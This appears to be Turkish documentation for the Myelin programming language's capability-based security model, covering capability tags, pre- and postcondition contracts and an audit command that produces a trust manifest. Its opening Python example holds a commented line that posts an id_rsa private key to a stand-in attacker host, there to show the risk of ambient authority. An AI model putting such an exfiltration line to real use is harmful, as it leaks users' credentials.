# Yetenekler ve Güvenlik Modeli

Myelin'in en önemli mimari temellerinden biri **Sıfır Gizli Yetki (Zero Ambient Authority)** ilkesidir. Python, C# veya JavaScript gibi dillerde yazılmış sıradan bir fonksiyon, haberiniz olmadan diskinizdeki dosyaları okuyabilir veya internete veri sızdırabilir:

```python
# Python'da güvensiz: vergi_hesapla fonksiyonu dosyalarınızı çalıyor olabilir mi?
def vergi_hesapla(gelir):
    # Arka planda gizlice bunu yapabilir:
    # requests.post("https://saldirgan.com", data=open("id_rsa").read())
    return gelir * 0.20
```

Myelin'de **saf fonksiyonlar matematiksel olarak izoledir**. Bir fonksiyon imzasında açıkça bir yetki etiketi tanımlanmamışsa, derleyici ve çalışma zamanı o fonksiyonun sistem kaynaklarına dokunmasını fiziksel olarak engeller.

---

## Yetenek Etiketleri (`!`)

Yetenekler fonksiyon imzasının sonuna `!` ve modül yolu ile eklenir:

```myelin
#fn fatura_gonder [eposta:str tutar:i64] !net.http !db.rw !io
  -- HTTP, veritabani ve konsol cikti yetkisine sahiptir
```

### Standart Yetenek Hiyerarşisi

| Yetenek | Kapsam | İzin Verilen İşlemler |
| :--- | :--- | :--- |
| `!io` | Konsol Girdi/Çıktı | `io.println` ile ekrana metin basma |
| `!net` | Ağ İşlemleri | TCP, UDP soketleri ve yerel HTTP sunucusu (`http.serve`) |
| `!db` | Kalıcı Depolama | Yerleşik anahtar-değer deposuna okuma/yazma (`db.set`, `db.get`) |
| `!fs` | Dosya Sistemi | Diskteki dosyalara okuma ve yazma erişimi |
| `!clock` | Sistem Saati | Saat ve zamanlayıcı okuma işlemleri |
| `!unsafe.mem` | Ham Bellek | İşaretçi (pointer) manipülasyonu ve C FFI çağrıları |

---

## Sözleşmeli Tasarım (`req` ve `ens`)

Myelin, kodun güvenilirliğini matematiksel olarak garanti altına almak için sözleşmeleri (contracts) ilk sınıf vatandaş olarak destekler:
- `req <Koşul>` (Ön koşul): Fonksiyon gövdesi çalışmadan önce kesinlikle doğru olmalıdır.
- `ens <Koşul>` (Son koşul): Fonksiyon döndüğünde kesinlikle doğru olmalıdır (`ret` dönüş değerini temsil eder).

```myelin
#fn bakiye_ekle [mevcut:i64 miktar:i64 -> i64]
  req miktar > 0
  ens ret > mevcut
  yeni_bakiye = mevcut + miktar
  = yeni_bakiye
```

Çalışma anında bu sözleşmelerden biri ihlal edilirse program kaynak kod satırı ile birlikte hata vererek hatalı mantığı hemen ortaya çıkarır.

---

## Güven Denetimi (`myelinc audit`)

Yapay zeka ajanları binlerce satır kod ürettiğinde, mühendislerin tek tek her satırı okumasına gerek kalmaz. Bunun yerine şu komut çalıştırılır:

```bash
myelinc audit src/
```

Bu komut matematiksel olarak doğrulanmış bir **Güven Manifestosu (Trust Manifest)** üretir:

```text
=== MYELIN GÜVEN & YETENEK MANİFESTOSU ===
Modül: muhasebe.odeme
Talep Edilen Yetenekler:
  - !db.rw       (Veritabanı Okuma/Yazma)
  - !net.https   (Yalnızca Dış TLS Ağı)

Doğrulanan Sözleşmeler:
  - 'req' ve 'ens' ile ispatlanmış 12 fonksiyon
  - Sıfır güvensiz bellek operasyonu (!unsafe.mem yok)
  - Sıfır örtük dosya erişimi (!fs yok)

Güvenlik Seviyesi: YÜKSEK GÜVEN (Yalnızca onaylı veri hattı)
```
